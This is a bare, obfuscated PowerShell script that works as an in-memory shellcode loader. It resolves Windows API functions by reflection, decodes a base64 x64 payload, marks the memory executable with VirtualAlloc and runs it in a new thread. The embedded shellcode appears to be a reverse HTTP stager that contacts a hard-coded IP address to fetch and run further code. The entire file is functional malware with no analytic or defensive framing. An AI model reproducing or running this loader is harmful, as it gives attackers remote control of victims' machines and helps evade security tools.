function pk {
	Param ($z2Zx, $qwcU)		
	$ch = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $ch.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ch.GetMethod('GetModuleHandle')).Invoke($null, @($z2Zx)))), $qwcU))
}

function ds57n {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $tIjo,
		[Parameter(Position = 1)] [Type] $t4vs = [Void]
	)
	
	$it = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$it.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $tIjo).SetImplementationFlags('Runtime, Managed')
	$it.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $t4vs, $tIjo).SetImplementationFlags('Runtime, Managed')
	
	return $it.CreateType()
}

[Byte[]]$x8UEH = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAA3MS4xOTMuMTU5LjI0NABaSInBScfAAwQAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6KcAAAAvaTV3QWQyUkw0Z1NKd0lqQzB4RXF5QTIwSHhsWXFteXFvSEEwYnFUTGVWNVRacWF2emdRVlNWVjM0bDA4TmtEQi1uQVJ0bkEwRFZkZzlhQ1Fuak5ZZmJHdXBtQTVWZTJxVmZpZTgyZzZLWlZyeWRPN3FiSWtjYUp4RXpHbXBFRjdOZ2VyUG5PLXN0X1BKekxHenJPUlZ2bjE0Smx1NUREcFhzdEpJAEiJwVNaQVhNMclTSLgAAiCEAAAAAFBTU0nHwutVLjv/1UiJxmoKX1NaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC68zoVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZScfC8LWiVv/V")
		
$uS3l = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pk kernel32.dll VirtualAlloc), (ds57n @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $x8UEH.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($x8UEH, 0, $uS3l, $x8UEH.length)

$wSRp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pk kernel32.dll CreateThread), (ds57n @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$uS3l,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pk kernel32.dll WaitForSingleObject), (ds57n @([IntPtr], [Int32]))).Invoke($wSRp,0xffffffff) | Out-Null